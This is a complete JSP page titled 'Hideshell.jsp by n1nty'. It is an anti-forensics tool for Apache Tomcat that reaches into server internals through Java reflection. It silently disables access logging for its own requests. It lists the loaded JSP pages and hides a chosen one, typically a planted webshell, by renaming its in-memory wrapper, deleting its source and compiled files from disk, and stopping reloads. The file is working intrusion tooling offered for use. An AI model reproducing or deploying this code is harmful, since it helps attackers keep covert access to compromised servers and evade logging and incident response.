<%@page import="java.awt.SystemColor"%>
<%@page import="org.apache.jasper.JspCompilationContext"%>
<%@page import="java.io.File"%>
<%@page import="java.util.Map"%>
<%@page import="org.apache.jasper.EmbeddedServletOptions"%>
<%@page import="org.apache.jasper.compiler.JspRuntimeContext"%>
<%@page import="org.apache.jasper.servlet.JspServletWrapper" %>
<%@page import="org.apache.catalina.valves.AccessLogValve"%>
<%@page import="org.apache.catalina.AccessLog"%>
<%@page import="org.apache.catalina.core.AccessLogAdapter"%>
<%@page import="org.apache.catalina.core.StandardHost"%>
<%@ page import="org.apache.catalina.core.ApplicationContext"%>
<%@ page import="org.apache.catalina.core.StandardContext"%>
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<%@ page import="java.lang.reflect.*" %>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Hideshell.jsp by n1nty</title>
</head>
<body>
<%!
public static Object invoke(Object obj, String methodName, Class[] paramTypes, Object[] args) throws Exception {
	Method m = obj.getClass().getDeclaredMethod(methodName, paramTypes);
	m.setAccessible(true);
	return m.invoke(obj, args);
}
public static Object getFieldValue(Object obj, String fieldName) throws Exception {
	Field f = obj.getClass().getDeclaredField(fieldName);
	f.setAccessible(true);
	return f.get(obj);
}
public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
	Field f = obj.getClass().getDeclaredField(fieldName);
	f.setAccessible(true);
	f.set(obj, value);
}
public static String makeHiddenName(String wrapperName) {
	int lastIndex = wrapperName.lastIndexOf('/');
	return wrapperName.substring(0, lastIndex + 1) + "hidden-" + wrapperName.substring(lastIndex + 1);
}
public static boolean isHiddenJsp(ServletRequest request, JspServletWrapper wrapper) {
	JspCompilationContext ctxt = wrapper.getJspEngineContext();
	if (!new File(request.getServletContext().getRealPath(ctxt.getJspFile())).exists()) {
		return true;
	}
	
	return  false;
}
public static void nolog(HttpServletRequest request) throws Exception {
	ServletContext ctx = request.getSession().getServletContext();
	ApplicationContext appCtx = (ApplicationContext)getFieldValue(ctx, "context");
	StandardContext standardCtx = (StandardContext)getFieldValue(appCtx, "context");
	
	StandardHost host = (StandardHost)standardCtx.getParent();
	AccessLogAdapter accessLog = (AccessLogAdapter)host.getAccessLog();
	
	AccessLog[] logs = (AccessLog[])getFieldValue(accessLog, "logs");
	for(AccessLog log:logs) {
		AccessLogValve logV = (AccessLogValve)log;
		String condition = logV.getCondition() == null ? "n1nty_nolog" : logV.getCondition();
		logV.setCondition(condition);
		request.setAttribute(condition, "n1nty_nolog");
	}
}
%>
<ul>
<%

nolog(request);

Object r = getFieldValue(request, "request");
Object filterChain = getFieldValue(r, "filterChain");
Object servlet = getFieldValue(filterChain, "servlet");
JspRuntimeContext jctxt = (JspRuntimeContext)getFieldValue(servlet, "rctxt");

String action = request.getParameter("action");



ServletContext servletContext = request.getServletContext();


if (action == null || action.equals("list")) {
	Map<String, JspServletWrapper> jsps = (Map<String, JspServletWrapper>)getFieldValue(jctxt, "jsps");
	for (Map.Entry<String, JspServletWrapper> entry : jsps.entrySet()) {
		JspServletWrapper wrapper = entry.getValue();
		%>
		<li>
		<a href='?action=hide&wrapperName=<%=entry.getKey() %>'>Hide <%=entry.getKey() %></a> 
		<%
		if (isHiddenJsp(request, wrapper)) {
			%>
			possible hidden file,  <a href='?action=delete&wrapperName=<%=entry.getKey() %>'> Delete </a>
			<%
		}
		%>
		</li>
		<%
	}
} else if (action.equals("hide")) {
	String wrapperName = request.getParameter("wrapperName");
	String hiddenWrapperName = makeHiddenName(wrapperName);
	if (jctxt.getWrapper(hiddenWrapperName) == null) {
		JspServletWrapper wrapper = jctxt.getWrapper(wrapperName);
		
		wrapper.setLastModificationTest(System.currentTimeMillis() + 31536000 * 1000);
		JspCompilationContext ctxt = wrapper.getJspEngineContext();
		EmbeddedServletOptions jspServletOptions = (EmbeddedServletOptions)ctxt.getOptions();
		if ((Integer)getFieldValue(jspServletOptions, "modificationTestInterval") <= 0) {
			setFieldValue(jspServletOptions, "modificationTestInterval", 1);	
		}
		
		wrapper.getJspEngineContext().getCompiler().removeGeneratedFiles();
		
		jctxt.addWrapper(hiddenWrapperName, wrapper);
		jctxt.removeWrapper(wrapperName);
		
		new File(servletContext.getRealPath(wrapperName)).delete();
	}
	out.println("done");
}  else if (action.equals("delete")) {
	String wrapperName = request.getParameter("wrapperName");
	jctxt.removeWrapper(wrapperName);
	out.println("done");
	
}
%>
</ul>
</body>
</html>